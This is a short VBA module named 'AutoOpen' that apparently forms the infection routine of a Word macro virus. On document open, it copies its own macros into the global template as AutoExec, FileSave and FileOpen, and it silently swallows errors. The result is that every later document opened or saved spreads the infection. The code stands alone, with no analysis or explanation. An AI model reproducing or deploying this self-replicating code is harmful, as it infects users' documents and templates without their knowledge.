   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()

       On Error GoTo -1: On Error GoTo ErrorHandler

       WordBasic.MacroCopy WordBasic.[FileName$]() + ":TempAutoExec", "Global:AutoExec"
       WordBasic.MacroCopy WordBasic.[FileName$]() + ":TempFileSave", "Global:FileSave"
       WordBasic.MacroCopy WordBasic.[FileName$]() + ":TempFileOpen", "Global:FileOpen"
       WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "Global:TempAutoOpen"

       GoTo Finished

   ErrorHandler:

       Select Case Err.Number

           Case Else

       End Select

   Finished:

   End Sub
